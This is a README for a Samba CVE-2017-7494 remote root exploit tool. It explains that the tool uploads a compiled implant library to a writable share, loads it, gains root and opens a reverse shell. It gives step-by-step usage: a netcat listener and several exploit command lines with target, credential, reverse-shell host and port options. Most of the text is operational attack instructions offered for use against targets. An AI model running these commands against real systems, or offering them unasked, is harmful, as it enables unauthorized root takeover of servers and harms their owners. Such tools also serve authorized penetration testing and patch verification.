# CVE-2017-7494

Remote root exploit for the SAMBA CVE-2017-7494 vulnerability.

## Details

This exploit is divided in 2 parts:

 * First, it compiles a payload called "implant.c" and generates a library (libimplantx32.so or libimplantx64.so) that changes to the root user, detaches from the parent process and spawns a reverse shell.
 * Second, it finds a writeable share in the specified target host, uploads the library with a random name and tries to load it.

As long as the target is vulnerable and the payload is the correct for the target operating system and architecture, the exploit is 100% reliable.

## How to

In your machine, run the following command:

```
$ nc -p 31337 -l
```

Then, run the exploit against your target and wait until it connects back to your Netcat:

```
$ python cve_2017_7494.py -t target_ip
```

If you close too fast the reverse shell, instead of running again the exploit uploading the module, etc... you can just pass the path to the module it already uploaded. Supposing it was uploaded to /shared/directory/ as "module.so", you would run a command like the following one:

```
$ python cve_2017_7494.py -t target_ip -m /shared/directory/module.so
```


## UPDATE 11/25/2017 - Archivaldo

You can now run the exploit again samba 3.5.0 and 3.6.0, you just need add the argument -o 1
```
python cve_2017_7494.py -t target_ip -u test -P 123456 --rhost shell_ip --rport shell_port -o 1 
```

You can now use your own custom .so
```
python cve_2017_7494.py -t target_ip -u test -P 123456 -o 1 --custom myso.so
```

In case you need to run this script from a x86 machine, compiling the implant binaries will create two x86 files. Using the flag -n 1 you can disable compilation and copy libimplantx64.so from another machine.
```
python cve_2017_7494.py -t target_ip -u test -P 123456 --rhost shell_ip --rport shell_port -n 1
```

In case samba runs just on port 139. You can set the remote server port using the argument -p
```
python cve_2017_7494.py -t target_ip -p 139 -u test -P 123456 --rhost shell_ip --rport shell_port -n 1
```

## NOTES

I do not support it anymore.

--
Joxean Koret
